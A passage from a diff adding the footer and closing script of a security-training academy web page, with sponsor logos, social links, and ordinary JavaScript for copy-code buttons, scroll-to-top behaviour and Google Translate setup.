+                        <img alt="GDG" class="mx-auto object-contain min-h-[110px] sm:min-h-[130px] md:min-h-[150px] max-h-[140px] sm:max-h-[160px] md:max-h-[180px] max-w-[200px] sm:max-w-[240px] md:max-w-[260px] w-auto" src="https://rednexus.academy/assets/gdg-Df6L4Ii3.png" onerror="this.onerror=null;this.src='https://placehold.co/200x120/white/black?text=GDG'">
+                    </a>
+                    <a href="#" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center p-2 transition-transform duration-200 hover:scale-105 hover:opacity-95" aria-label="Green Armor">
+                        <img alt="Green Armor" class="mx-auto object-contain min-h-[96px] sm:min-h-[110px] md:min-h-[128px] max-h-[120px] sm:max-h-[140px] md:max-h-[160px] max-w-[180px] sm:max-w-[200px] md:max-w-[220px] w-auto" src="https://rednexus.academy/assets/greenarmor-oZ_OwdCW.png" onerror="this.onerror=null;this.src='https://placehold.co/200x120/white/black?text=Green+Armor'">
+                    </a>
+                    <a href="#" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center p-2 transition-transform duration-200 hover:scale-105 hover:opacity-95" aria-label="INE">
+                        <img alt="INE" class="mx-auto object-contain min-h-[96px] sm:min-h-[110px] md:min-h-[128px] max-h-[120px] sm:max-h-[140px] md:max-h-[160px] max-w-[180px] sm:max-w-[200px] md:max-w-[220px] w-auto" src="https://ine.com/assets/logos/INE-Logo-Orange-White-Revised.svg" onerror="this.onerror=null;this.src='https://placehold.co/200x120/white/black?text=INE'">
+                    </a>
+                </div>
+            </div>
+            <div class="w-20 h-[2px] bg-white/40 mx-auto mb-6 rounded-full"></div>
+            <div class="flex justify-center gap-6 text-2xl mb-3">
+                <a href="https://wa.me/201003425890" class="text-[#25D366] hover:opacity-80" aria-label="WhatsApp" target="_blank" rel="noopener noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"></path></svg></a>
+                <a href="https://www.facebook.com/RedNexusAcademy/" class="text-[#1877F2] hover:opacity-80" aria-label="Facebook" target="_blank" rel="noopener noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"></path></svg></a>
+                <a href="https://x.com/rednexusacademy" class="text-[#1DA1F2] hover:opacity-80" aria-label="Twitter" target="_blank" rel="noopener noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a>
+                <a href="https://hossamshady.medium.com/" class="text-white hover:opacity-80" aria-label="Medium" target="_blank" rel="noopener noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M0 32v448h448V32H0zm372.2 106.1l-24 23c-2.1 1.6-3.1 4.2-2.7 6.7v169.3c-.4 2.6.6 5.2 2.7 6.7l23.5 23v5.1h-118V367l24.3-23.6c2.4-2.4 2.4-3.1 2.4-6.7V199.8l-67.6 171.6h-9.1L125 199.8v115c-.7 4.8 1 9.7 4.4 13.2l31.6 38.3v5.1H71.2v-5.1l31.6-38.3c3.4-3.5 4.9-8.4 4.1-13.2v-133c.4-3.7-1-7.3-3.8-9.8L75 138.1V133h87.3l67.4 148L289 133.1h83.2v5z"></path></svg></a>
+                <a href="mailto:support@rednexus.academy" class="text-[#D14836] hover:opacity-80" aria-label="Email"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path></svg></a>
+            </div>
+            <p class="text-sm mt-2 text-gray-400 text-center">
+                © 2025 RedNexus® Institute.<br>
+                All course titles on this website are trademarks of RedNexus Institute.
+            </p>
+        </div>
+    </footer>
+
+    <script>
+        // Copy Code Functionality
+        function copyCode(button) {
+            const container = button.closest('.code-block-wrapper');
+            let codeText = '';
+            
+            // Try to find code content
+            const prompts = container.querySelectorAll('.terminal-prompt');
+            const outputs = container.querySelectorAll('.terminal-output');
+            
+            // Construct text to copy
+            prompts.forEach(p => {
+                const promptContent = window.getComputedStyle(p, '::before').content.replace(/['"]/g, '');
+                codeText += promptContent + p.innerText + '\n';
+            });
+            
+            if(prompts.length === 0) {
+                 // Fallback for non-terminal code blocks
+                 codeText = container.innerText.replace('Copy', '').trim();
+            }
+
+            // Fallback for simple copy
+            if(!codeText) {
+                codeText = container.innerText;
+            }
+
+            // Create temporary textarea
+            const textarea = document.createElement('textarea');
+            textarea.value = codeText;
+            document.body.appendChild(textarea);
+            textarea.select();
+            
+            try {
+                document.execCommand('copy');
+                const originalText = button.innerText;
+                button.innerText = 'Copied!';
+                button.classList.add('copied');
+                
+                setTimeout(() => {
+                    button.innerText = originalText;
+                    button.classList.remove('copied');
+                }, 2000);
+            } catch (err) {
+                console.error('Failed to copy text', err);
+            }
+            
+            document.body.removeChild(textarea);
+        }
+
+        // Scroll to Top Button Logic
+        const scrollToTopBtn = document.getElementById("scrollToTopBtn");
+        
+        window.addEventListener("scroll", () => {
+            if (window.scrollY > 300) {
+                scrollToTopBtn.classList.remove("opacity-0", "pointer-events-none");
+            } else {
+                scrollToTopBtn.classList.add("opacity-0", "pointer-events-none");
+            }
+        });
+
+        scrollToTopBtn.addEventListener("click", () => {
+            window.scrollTo({
+                top: 0,
+                behavior: "smooth"
+            });
+        });
+
+        // Google Translate Init
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({
+                pageLanguage: 'en',
+                includedLanguages: 'ar,en', // Only English and Arabic
+                layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+                autoDisplay: false
+            }, 'google_translate_element');
+        }
+
+        // Apply 'notranslate' to code blocks to prevent translation of technical commands
+        document.addEventListener('DOMContentLoaded', () => {
+            // Select code containers, prompts, outputs, and any element using the code font
+            const techElements = document.querySelectorAll('.code-font, .terminal-prompt, .terminal-output, pre, code, .bg-slate-900');
+            techElements.forEach(el => {
+                el.classList.add('notranslate');
+                el.setAttribute('translate', 'no');
+            });
+        });
+    </script>
+    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</body>
+</html>
